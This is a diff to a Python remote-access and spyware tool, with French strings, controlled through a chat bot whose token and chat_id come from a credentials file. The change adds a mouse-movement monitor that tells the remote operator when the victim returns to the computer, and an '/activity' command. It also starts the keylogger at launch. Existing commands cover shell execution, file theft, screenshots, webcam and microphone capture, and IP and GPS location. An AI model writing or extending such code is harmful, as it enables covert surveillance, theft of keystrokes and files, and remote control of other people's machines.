@@ -1,29 +1,35 @@
-import requests, datetime, time, geocoder, threading, json, sys, subprocess, os, mss, keyboard, pathlib, shutil, cv2, pyaudio, wave, audioop, ffmpeg
+import requests, datetime, time, geocoder, threading, json, sys, subprocess, os, mss, keyboard, pathlib, shutil, cv2, pyaudio, wave, audioop, ffmpeg, pynput
 
 """
-pip install requests geocoder mss keyboard pathlib opencv-python pyaudio wave audioop ffmpeg-python
-"""
- 
-commandes = """
-Envoyer photo ou document
-/cd DIR
-/cmd SHELL_COMMAND
-/getFile PATH
-/datadir
-/startdir
-/screenshot
-/keylogger_start
-/keylogger_stop
-/keylogger_flush
-/keylogger_get
-/keylogger_status
-/purgeall
-/getPublicIP
-/webcam_capture
-/record_sound_start (10 min max)
-/record_sound_stop
+pip install requests geocoder mss keyboard pathlib opencv-python pyaudio wave audioop ffmpeg-python pynput
 """
 
+
+def detectActivity():
+	
+	global last_activity
+	
+	mouse = pynput.mouse.Controller()
+	before = mouse.position
+	while True:
+		
+		current = mouse.position
+		if before != current:
+			
+			inactivite = round(datetime.datetime.now().timestamp()) - round(last_activity.timestamp())
+			
+			if inactivite > 60 * 15 :
+				
+				sendMessage(f"Activite detectee, retour apres {inactivite/60} minutes d'absence")
+			
+			last_activity = datetime.datetime.now()
+			
+			print(f"Movement detected {inactivite}")
+		
+		before = current
+		
+		time.sleep(5)
+	
 
 def recordSound():
 	
@@ -146,6 +152,29 @@ def get_current_gps_coordinates():
 
 if __name__ == "__main__":
 
+ 
+	commandes = """
+	Envoyer photo ou document
+	/cd DIR
+	/cmd SHELL_COMMAND
+	/getFile PATH
+	/datadir
+	/startdir
+	/screenshot
+	/keylogger_start
+	/keylogger_stop
+	/keylogger_flush
+	/keylogger_get
+	/keylogger_status
+	/purgeall
+	/getPublicIP
+	/webcam_capture
+	/record_sound_start (10 min max)
+	/record_sound_stop
+	/activity
+	"""
+
+
 	if getattr(sys, 'frozen', False):  startdir = pathlib.Path(sys.executable).parent.resolve()
 	else: startdir = os.path.dirname(os.path.abspath(__file__))
 	print(startdir)
@@ -155,7 +184,7 @@ if __name__ == "__main__":
 		sys.exit(0)
 	else:
 		with open(f"{startdir}\\credentials.txt", 'r') as fcred: credentials = json.loads(fcred.read())
-
+	
 	appdata = os.getenv('APPDATA')
 	appname = credentials['appname']
 	datadir = f"{appdata}\\{appname}"
@@ -163,17 +192,24 @@ if __name__ == "__main__":
 	pathlib.Path(f"{datadir}\\photos").mkdir(parents=True, exist_ok=True)
 	pathlib.Path(f"{datadir}\\documents").mkdir(parents=True, exist_ok=True)
 	log_file = datadir+'\\keystrokes.txt'
-
-	print(f"{appname} started")
-
+	
 	first = True
 	last_update = 0
 	recording = False
 	keylogging = True
-
-	last_time_recieved = round(datetime.datetime.now().timestamp())
-
-	 
+	TOKEN = credentials['token']
+	chat_id = credentials['chat_id']
+	last_activity = datetime.datetime.now()
+	last_time_recieved =  round(datetime.datetime.now().timestamp())
+	
+	keylogger = threading.Thread(target=startKeylogger)
+	keylogger.start()
+	
+	activity = threading.Thread(target=detectActivity)
+	activity.start()
+	
+	print(f"{appname} started")
+	
 	while True:
 		
 		try:
@@ -181,12 +217,7 @@ if __name__ == "__main__":
 			print("[+] Listening....")
 			
 			if first:
-			
-				keylogger = threading.Thread(target=startKeylogger)
-				keylogger.start()
 				
-				TOKEN = credentials['token']
-				chat_id = credentials['chat_id']
 				date = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
 				coords = get_current_gps_coordinates()
 				ip = requests.get('https://checkip.amazonaws.com').text.strip()
@@ -316,6 +347,9 @@ if __name__ == "__main__":
 					
 					elif "/record_sound_stop" in last_message['message']['text']:
 						recording = False
+					
+					elif "/activity" in  last_message['message']['text']:
+						sendMessage(f"Derniere activite : {last_activity.strftime("%d/%m/%Y %H:%M:%S")}")
 					
 					out = subprocess.getoutput("cd")
 					sendMessage(f"/man {out}>")
